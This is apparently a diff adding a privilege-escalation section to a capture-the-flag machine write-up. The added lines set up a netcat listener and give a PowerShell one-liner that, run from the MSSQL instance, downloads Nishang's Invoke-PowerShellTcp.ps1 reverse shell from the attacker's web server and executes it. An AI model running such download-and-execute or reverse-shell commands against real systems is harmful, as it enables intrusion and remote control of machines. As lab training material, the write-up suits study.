@@ -162,3 +162,9 @@ which returns the result of `whoami` as `scrm\miscsvc`
 From here I can get the user flag by changing `whoami` to `cat c:\users\miscsvc\desktop\user.txt` in the scriptblock:
 
 <img src="Images/user.png" width=500>
+
+Privilege Escalation
+--------------------
+Now I'll get a shell on the box as `sqlsvc` so that I can use `SeImpersonatePrivilege`
+
+To do this I'll run `rlwrap nc -nvlp 8000` to start a netcat listener on port 8000, while hosting Nishang's `Invoke-PowerShellTcp.ps1` reverse shell on a webserver then execute `IEX(New-Object Net.WebClient).downloadString('http://10.10.14.43/Invoke-PowerShellTcp.ps1')` from the MSSQL instance. 
